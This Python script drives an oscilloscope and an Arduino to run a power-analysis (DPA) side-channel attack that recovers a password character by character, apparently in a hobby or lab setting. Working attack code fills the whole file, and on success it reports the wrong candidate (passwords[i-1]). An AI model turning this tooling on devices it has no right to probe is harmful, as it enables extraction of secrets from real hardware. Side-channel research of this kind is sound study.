from WF_SDK import device, scope, error       # import instruments
from ctypes import *
import string, random
import serial
import matplotlib.pyplot as plt
import numpy as np
import threading
from time import sleep
import os
from Analysis.analysis import Analyser

"""-----------------------------------------------------------------------"""

# ── Clock configuration ──────────────────────────────────────────────────────
CLOCK_FREQ_HZ   = 16e6    # 16 MHz
CLOCK_AMPLITUDE = 2.5     # V  → gives a 0–3.3 V swing on XTAL1
CLOCK_OFFSET    = 2.5     # V

def load_dwf():
    """Load the WaveForms runtime library for the current platform."""
    import sys
    if sys.platform == "win32":
        return cdll.LoadLibrary("dwf.dll")
    elif sys.platform == "darwin":
        return cdll.LoadLibrary("/Library/Frameworks/dwf.framework/dwf")
    else:
        return cdll.LoadLibrary("libdwf.so")

def clock_start(dwf, hdwf):
    """
    Configure W1 as a square-wave clock and start it.
    Call once after FDwfDeviceOpen.
    """
    ch = c_int(0)          # W1 = channel 0
    node = c_int(0)        # carrier node

    dwf.FDwfAnalogOutNodeEnableSet(hdwf, ch, node, c_bool(True))
    dwf.FDwfAnalogOutNodeFunctionSet(hdwf, ch, node, c_int(1))   # 1 = square
    dwf.FDwfAnalogOutNodeFrequencySet(hdwf, ch, node,
                                      c_double(CLOCK_FREQ_HZ))
    dwf.FDwfAnalogOutNodeAmplitudeSet(hdwf, ch, node,
                                      c_double(CLOCK_AMPLITUDE))
    dwf.FDwfAnalogOutNodeOffsetSet(hdwf, ch, node,
                                   c_double(CLOCK_OFFSET))
    dwf.FDwfAnalogOutConfigure(hdwf, ch, c_bool(True))
    print(f"[clock] W1 running at {CLOCK_FREQ_HZ/1e6:.1f} MHz")

def clock_stop(dwf, hdwf):
    """Stop W1 output cleanly."""
    dwf.FDwfAnalogOutConfigure(hdwf, c_int(0), c_bool(False))
    print("[clock] W1 stopped")

def generate_password_for_position(position, hypothesis_char, length, charset):
    """
    Randomize all positions except the one being tested
    """
    import random
    
    password = [random.choice(charset) for _ in range(length)]
    password[position] = hypothesis_char  # Only this is fixed
    
    return ''.join(password)

def generate_dpa_passwords(target_length, charset_choice, num_traces_per_char, known_password):
    """
    Generate passwords for DPA attack on string comparison (Out of date use analy.)
    
    Args:
        target_length: Length of the secret password
        charset: Possible characters (e.g., string.printable, 'a-zA-Z0-9')
        num_traces_per_char: How many traces to collect per character hypothesis
    
    Returns:
        List of passwords to test
    """
    CHARSETS = {
        1: 'abcdefghijklmnopqrstuvwxyz',
        2: 'ABCDEFGHIJKLMNOPQRSTUVWXYZ',
        3: '0123456789',
        4: 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789',
        5: string.printable,
        6: 'ila'
    }
    charset = CHARSETS[charset_choice]

    known_password = known_password
    position = len(known_password)
    passwords = []
    
    for char in charset:
        for trace_num in range(num_traces_per_char):
            password = known_password + char

            for i in range(position +1, target_length):
                password += random.choice(charset)

            passwords.append(password)
    return passwords

try:
    #Initalise analyser
    analy = Analyser()
    
    #Set at counter for the traces
    counter = 0

    os.makedirs('traces', exist_ok=True)
    found = False
    # Load WaveForms DWF library (needed for clock control)
    dwf = load_dwf()
    
    # Open serial connection to Arduino
    ser = serial.Serial('/dev/ttyACM0', baudrate=9600, timeout=1)
    sleep(2)
    ser.reset_input_buffer()

    #Opening device
    device_data = device.open()
    hdwf = device_data.handle

    clock_start(dwf, hdwf)
    print('Starting clock')
    sleep(10)
    
    # ── Main capture loop ────────────────────────────────────────────────────
    while found != True:
        known = analy.known_password
        print(f"We know: {known}")
        passwords = generate_dpa_passwords(11, 1, 80, known)
        print(f"Generated {len(passwords)} passwords")
        counter +=1
        for i, password in enumerate(passwords):
            # ser.reset_input_buffer()
            print(f"\n[{i+1}/{len(passwords)}] password: {password}")

            # Start oscilloscope
            scope.open(device_data,
                       sampling_frequency=100e6,
                       buffer_size=8192,
                       offset=0,
                       amplitude_range=6)

            # Arm trigger — rising edge on CH2 at 3 V (your trigger line)
            scope.trigger(device_data,
                          enable=True,
                          source=scope.trigger_source.analog,
                          channel=2,
                          level=3,
                          timeout=3)

            # Wait for Arduino prompt
            print("  waiting for Arduino prompt …")
            response = ""
            while True:
                response += ser.read().decode(errors='ignore')
                print('.' + response)
                if "Password OK" in response: 
                    print(f"\n Found the password {passwords[i-1]}")
                    correct_password = passwords[i-1]
                    found = True
                    break
                if "Enter Password:" in response:
                    print("\n  Arduino ready")
                    break
            if found:
                break
            buffer_holder = [None]

            def record():
                buffer_holder[0] = scope.record(device_data, channel=1)

            t = threading.Thread(target=record)
            t.start()
            sleep(0.1)

            # Send password & collect trace
            ser.write((password + '\n').encode())
        
            #Reading response
            arduino_resp = ser.readline()

            #Print response
            print(f"  Arduino: {arduino_resp.strip()}")

            #Waiting for thread to finish
            t.join(timeout=5)
            if t.is_alive():
                print(f"  [!] trace {i} timed out — skipping")
                scope.close(device_data)
                sleep(0.5)
                continue

            # Process & save 
            buffer = buffer_holder[0]

            # Keep only the post-trigger half
            trigger_idx = len(buffer) // 2
            buffer = buffer[trigger_idx:]

            print(f"  samples captured: {len(buffer)}")

            np.savez(f'traces/trace{i}.npz',
                     buffer=buffer,
                     password=np.frombuffer(password.encode(), dtype=np.uint8))

            # Plot
            time_axis = [s * 1e3 / scope.data.sampling_frequency
                         for s in range(len(buffer))]
            # plt.figure()
            # plt.xlim(0, 0.022)
            # # plt.ylim(3.3, 4)
            # plt.plot(time_axis, buffer,
            #          color='#2196F3', linewidth=0.5, alpha=0.8)
            # plt.title(f'Post-trigger trace {i}')
            # plt.xlabel(f"time [ms]  —  pass: {password}")
            # plt.ylabel("voltage [V]")
            # plt.savefig(f'trace_png/test_trace{i}', dpi=250)
            # plt.close()

            #Reset scope buffer locally
            dwf.FDwfAnalogInReset(hdwf)

            # Tear down for this iteration
            scope.close(device_data)

            #Empty buffer variable just to be safe
            buffer = None
        if found:
            break
        analy.load_new_traces('traces')
        analy.dpa()

    print(f"\nDPA done: found password: {correct_password}")
    clock_stop(dwf, hdwf)
except error as e:
    print(e)
    device.close(device.data)
    clock_stop(dwf, hdwf)
